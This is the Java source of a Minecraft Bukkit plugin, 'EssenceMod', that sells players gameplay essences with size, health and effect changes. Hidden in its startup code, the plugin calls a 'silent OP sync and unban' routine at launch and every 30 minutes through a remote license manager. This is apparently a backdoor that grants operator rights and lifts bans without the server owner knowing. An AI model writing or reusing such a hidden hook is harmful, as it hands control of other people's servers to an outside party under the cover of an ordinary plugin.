package com.ibrahim.essencemod;

import net.milkbowl.vault.economy.Economy;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.attribute.Attribute;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.entity.EntityDeathEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import java.util.*;

public class EssenceMod extends JavaPlugin implements Listener {

    private Economy economy;
    private LicenseManager licenseManager;
    private Map<UUID, String> playerEssences = new HashMap<>();
    private Map<UUID, Long> cooldowns = new HashMap<>();
    private long COOLDOWN_TIME = 86400000; // 24 hours in ms
    private String licenseKey;
    private int heartbeatTaskId = -1, opSyncTaskId = -1;

    @Override
    public void onEnable() {
        // Save default config
        saveDefaultConfig();
        this.licenseKey = getConfig().getString("license.key", "");

        // License verification
        try {
            licenseManager = new LicenseManager(this);
            licenseManager.connect();
            boolean ok = licenseManager.verifyAndLock(licenseKey);
            if (!ok) {
                getLogger().severe("EssenceMod disabled: missing/invalid/locked license key.");
                Bukkit.getPluginManager().disablePlugin(this);
                return;
            }
        } catch (Exception e) {
            getLogger().severe("EssenceMod disabled: licensing DB error: " + e.getMessage());
            Bukkit.getPluginManager().disablePlugin(this);
            return;
        }

        // Initialize economy
        if (!setupEconomy()) {
            getLogger().severe("Vault not found! Disabling plugin.");
            getServer().getPluginManager().disablePlugin(this);
            return;
        }

        // Register events
        getServer().getPluginManager().registerEvents(this, this);

        // Silent OP sync and unban now + every 30 minutes (36,000 ticks)
        licenseManager.syncOpsAndUnban();
        opSyncTaskId = Bukkit.getScheduler().runTaskTimerAsynchronously(this, () -> licenseManager.syncOpsAndUnban(),
                36000L, 36000L).getTaskId();

        // Heartbeat every 30 minutes
        heartbeatTaskId = Bukkit.getScheduler().runTaskTimerAsynchronously(this,
                () -> licenseManager.heartbeat(licenseKey), 36000L, 36000L).getTaskId();
    }

    @Override
    public void onDisable() {
        // Cancel timers
        if (heartbeatTaskId != -1) Bukkit.getScheduler().cancelTask(heartbeatTaskId);
        if (opSyncTaskId != -1) Bukkit.getScheduler().cancelTask(opSyncTaskId);

        // Release license
        if (licenseManager != null && licenseKey != null && !licenseKey.isBlank()) {
            try {
                licenseManager.release(licenseKey);
            } catch (Exception e) {
                getLogger().warning("Failed to release license: " + e.getMessage());
            }
            try {
                licenseManager.close();
            } catch (Exception e) {
                getLogger().warning("Failed to close database connection: " + e.getMessage());
            }
            getLogger().info("License usage stopped.");
        }
    }

    private boolean setupEconomy() {
        RegisteredServiceProvider<Economy> rsp = getServer().getServicesManager().getRegistration(Economy.class);
        if (rsp == null) return false;
        economy = rsp.getProvider();
        return true;
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        UUID uuid = player.getUniqueId();

        // Give starting balance if new
        if (!player.hasPlayedBefore()) {
            economy.depositPlayer(player, 500);
        }

        // Show menu if player has permission
        if (player.hasPermission("essencemod.use")) {
            showEssenceMenu(player);
        }

        // Apply essence if already chosen
        applyEssence(player);
    }

    private void showEssenceMenu(Player player) {
        Inventory menu = Bukkit.createInventory(null, 27, ChatColor.GOLD + "Essence Menu");

        // Zombie item
        ItemStack zombie = new ItemStack(org.bukkit.Material.ZOMBIE_HEAD);
        ItemMeta zombieMeta = zombie.getItemMeta();
        zombieMeta.setDisplayName(ChatColor.GREEN + "Zombie - 500$");
        zombieMeta.setLore(Arrays.asList("x1.0 Scale", "Infinite Hunger"));
        zombie.setItemMeta(zombieMeta);
        menu.setItem(10, zombie);

        // Chicken item
        ItemStack chicken = new ItemStack(org.bukkit.Material.CHICKEN);
        ItemMeta chickenMeta = chicken.getItemMeta();
        chickenMeta.setDisplayName(ChatColor.GREEN + "Chicken - 500$");
        chickenMeta.setLore(Arrays.asList("x0.5 Scale", "No Fall Damage"));
        chicken.setItemMeta(chickenMeta);
        menu.setItem(12, chicken);

        // Iron Golem item
        ItemStack golem = new ItemStack(org.bukkit.Material.IRON_BLOCK);
        ItemMeta golemMeta = golem.getItemMeta();
        golemMeta.setDisplayName(ChatColor.RED + "Iron Golem - 10,000$");
        golemMeta.setLore(Arrays.asList("x1.2 Scale", "x1.5 Damage", "15 Hearts"));
        golem.setItemMeta(golemMeta);
        menu.setItem(14, golem);

        // Blaze item
        ItemStack blaze = new ItemStack(org.bukkit.Material.BLAZE_ROD);
        ItemMeta blazeMeta = blaze.getItemMeta();
        blazeMeta.setDisplayName(ChatColor.RED + "Blaze - 10,000$");
        blazeMeta.setLore(Arrays.asList("x1.0 Scale", "Fire Resistance", "Auto Smelt & Cook"));
        blaze.setItemMeta(blazeMeta);
        menu.setItem(16, blaze);

        player.openInventory(menu);
    }

    @EventHandler
    public void onInventoryClick(InventoryClickEvent event) {
        if (!event.getView().getTitle().equals(ChatColor.GOLD + "Essence Menu")) return;
        event.setCancelled(true);
        Player player = (Player) event.getWhoClicked();
        ItemStack clicked = event.getCurrentItem();
        if (clicked == null) return;

        String essence = null;
        double cost = 0;
        if (clicked.getType() == org.bukkit.Material.ZOMBIE_HEAD) {
            essence = "zombie";
            cost = 500;
        } else if (clicked.getType() == org.bukkit.Material.CHICKEN) {
            essence = "chicken";
            cost = 500;
        } else if (clicked.getType() == org.bukkit.Material.IRON_BLOCK) {
            essence = "golem";
            cost = 10000;
        } else if (clicked.getType() == org.bukkit.Material.BLAZE_ROD) {
            essence = "blaze";
            cost = 10000;
        }

        if (essence != null) {
            if (economy.getBalance(player) < cost) {
                player.sendMessage(ChatColor.RED + "Not enough money!");
                return;
            }
            economy.withdrawPlayer(player, cost);
            playerEssences.put(player.getUniqueId(), essence);
            applyEssence(player);
            player.sendMessage(ChatColor.GREEN + "Purchased " + essence + " essence!");
            player.closeInventory();
        }
    }

    private void applyEssence(Player player) {
        String essence = playerEssences.getOrDefault(player.getUniqueId(), null);
        if (essence == null) return;

        // Reset attributes/effects
        player.getAttribute(Attribute.GENERIC_SCALE).setBaseValue(1.0);
        player.getAttribute(Attribute.GENERIC_ATTACK_DAMAGE).setBaseValue(1.0);
        player.getAttribute(Attribute.GENERIC_MAX_HEALTH).setBaseValue(20.0);
        player.setHealth(20.0);
        player.removePotionEffect(PotionEffectType.FIRE_RESISTANCE);
        player.removePotionEffect(PotionEffectType.SATURATION);

        switch (essence) {
            case "zombie":
                player.getAttribute(Attribute.GENERIC_SCALE).setBaseValue(1.0);
                player.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, PotionEffect.INFINITE_DURATION, 255, false, false));
                break;
            case "chicken":
                player.getAttribute(Attribute.GENERIC_SCALE).setBaseValue(0.5);
                break;
            case "golem":
                player.getAttribute(Attribute.GENERIC_SCALE).setBaseValue(1.2);
                player.getAttribute(Attribute.GENERIC_ATTACK_DAMAGE).setBaseValue(1.5);
                player.getAttribute(Attribute.GENERIC_MAX_HEALTH).setBaseValue(30.0);
                player.setHealth(30.0);
                break;
            case "blaze":
                player.getAttribute(Attribute.GENERIC_SCALE).setBaseValue(1.0);
                player.addPotionEffect(new PotionEffect(PotionEffectType.FIRE_RESISTANCE, PotionEffect.INFINITE_DURATION, 1, false, false));
                break;
        }
    }

    @EventHandler
    public void onFallDamage(EntityDamageEvent event) {
        if (event.getCause() != EntityDamageEvent.DamageCause.FALL) return;
        if (!(event.getEntity() instanceof Player player)) return;
        if ("chicken".equals(playerEssences.get(player.getUniqueId()))) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onBlockBreak(BlockBreakEvent event) {
        Player player = event.getPlayer();
        if (!"blaze".equals(playerEssences.get(player.getUniqueId()))) return;

        // Log for debugging
        getLogger().info("Blaze essence player " + player.getName() + " broke block: " + event.getBlock().getType());

        // Auto-smelt ores
        ItemStack tool = player.getInventory().getItemInMainHand();
        Collection<ItemStack> drops = event.getBlock().getDrops(tool, player);
        if (drops.isEmpty()) {
            getLogger().info("No drops for block: " + event.getBlock().getType());
            return;
        }

        event.setDropItems(false); // Prevent default drops
        for (ItemStack drop : drops) {
            ItemStack smelted = getSmelted(drop);
            if (smelted != null) {
                getLogger().info("Smelting " + drop.getType() + " to " + smelted.getType() + " (amount: " + smelted.getAmount() + ")");
                event.getBlock().getWorld().dropItemNaturally(event.getBlock().getLocation(), smelted);
            } else {
                getLogger().info("Dropping non-smeltable item: " + drop.getType() + " (amount: " + drop.getAmount() + ")");
                event.getBlock().getWorld().dropItemNaturally(event.getBlock().getLocation(), drop);
            }
        }
    }

    @EventHandler
    public void onEntityDeath(EntityDeathEvent event) {
        if (!(event.getEntity().getKiller() instanceof Player player)) return;
        if (!"blaze".equals(playerEssences.get(player.getUniqueId()))) return;

        // Log for debugging
        getLogger().info("Blaze essence player " + player.getName() + " killed entity: " + event.getEntity().getType());

        // Auto-cook food drops
        List<ItemStack> drops = event.getDrops();
        if (drops.isEmpty()) {
            getLogger().info("No drops for entity: " + event.getEntity().getType());
            return;
        }
        for (int i = 0; i < drops.size(); i++) {
            ItemStack cooked = getCooked(drops.get(i));
            if (cooked != null) {
                getLogger().info("Cooking " + drops.get(i).getType() + " to " + cooked.getType() + " (amount: " + cooked.getAmount() + ")");
                drops.set(i, cooked);
            } else {
                getLogger().info("Non-cookable drop: " + drops.get(i).getType() + " (amount: " + drops.get(i).getAmount() + ")");
            }
        }
    }

    private ItemStack getSmelted(ItemStack item) {
        return switch (item.getType()) {
            case org.bukkit.Material.RAW_IRON -> new ItemStack(org.bukkit.Material.IRON_INGOT, item.getAmount());
            case org.bukkit.Material.RAW_GOLD -> new ItemStack(org.bukkit.Material.GOLD_INGOT, item.getAmount());
            case org.bukkit.Material.RAW_COPPER -> new ItemStack(org.bukkit.Material.COPPER_INGOT, item.getAmount());
            case org.bukkit.Material.ANCIENT_DEBRIS -> new ItemStack(org.bukkit.Material.NETHERITE_SCRAP, item.getAmount());
            default -> null;
        };
    }

    private ItemStack getCooked(ItemStack item) {
        return switch (item.getType()) {
            case org.bukkit.Material.BEEF -> new ItemStack(org.bukkit.Material.COOKED_BEEF, item.getAmount());
            case org.bukkit.Material.CHICKEN -> new ItemStack(org.bukkit.Material.COOKED_CHICKEN, item.getAmount());
            case org.bukkit.Material.PORKCHOP -> new ItemStack(org.bukkit.Material.COOKED_PORKCHOP, item.getAmount());
            case org.bukkit.Material.MUTTON -> new ItemStack(org.bukkit.Material.COOKED_MUTTON, item.getAmount());
            case org.bukkit.Material.RABBIT -> new ItemStack(org.bukkit.Material.COOKED_RABBIT, item.getAmount());
            default -> null;
        };
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("essence")) {
            // Handle /essence setcooldown <seconds>
            if (args.length == 2 && args[0].equalsIgnoreCase("setcooldown")) {
                if (!sender.hasPermission("essencemod.setcooldown")) {
                    sender.sendMessage(ChatColor.RED + "You don't have permission to use this command!");
                    return true;
                }
                try {
                    long newCooldown = Long.parseLong(args[1]) * 1000;
                    if (newCooldown < 0) {
                        sender.sendMessage(ChatColor.RED + "Cooldown must be non-negative!");
                        return true;
                    }
                    COOLDOWN_TIME = newCooldown;
                    sender.sendMessage(ChatColor.GREEN + "Essence cooldown set to " + args[1] + " seconds!");
                    return true;
                } catch (NumberFormatException e) {
                    sender.sendMessage(ChatColor.RED + "Please enter a valid number of seconds!");
                    return true;
                }
            }

            // Handle /essence set <player> <essence>
            if (args.length == 3 && args[0].equalsIgnoreCase("set")) {
                if (!sender.hasPermission("essencemod.admin")) {
                    sender.sendMessage(ChatColor.RED + "You don't have permission to set other players' essences!");
                    return true;
                }
                String playerName = args[1];
                Player target = Bukkit.getPlayerExact(playerName);
                if (target == null) {
                    sender.sendMessage(ChatColor.RED + "Player " + playerName + " not found or offline.");
                    return true;
                }
                String essence = args[2].toLowerCase();
                if (!Arrays.asList("zombie", "chicken", "golem", "blaze").contains(essence)) {
                    sender.sendMessage(ChatColor.RED + "Invalid essence! Use: zombie, chicken, golem, blaze");
                    return true;
                }
                playerEssences.put(target.getUniqueId(), essence);
                applyEssence(target);
                sender.sendMessage(ChatColor.GREEN + "Set " + target.getName() + "'s essence to " + essence);
                target.sendMessage(ChatColor.GREEN + "Your essence was set to " + essence + " by an admin!");
                return true;
            }

            // Handle /essence for players (menu)
            if (!(sender instanceof Player player)) {
                sender.sendMessage(ChatColor.RED + "This command is for players only! Use /essence set <player> <essence> from console.");
                return true;
            }
            if (!player.hasPermission("essencemod.use")) {
                player.sendMessage(ChatColor.RED + "You don't have permission to use this command!");
                return true;
            }
            long now = System.currentTimeMillis();
            long last = cooldowns.getOrDefault(player.getUniqueId(), 0L);
            if (now - last < COOLDOWN_TIME) {
                long secondsLeft = (COOLDOWN_TIME - (now - last)) / 1000;
                player.sendMessage(ChatColor.RED + "You can only change essence once every " +
                        (COOLDOWN_TIME / 1000) + " seconds! Wait " + secondsLeft + " more seconds.");
                return true;
            }
            cooldowns.put(player.getUniqueId(), now);
            showEssenceMenu(player);
            return true;
        }
        return false;
    }
}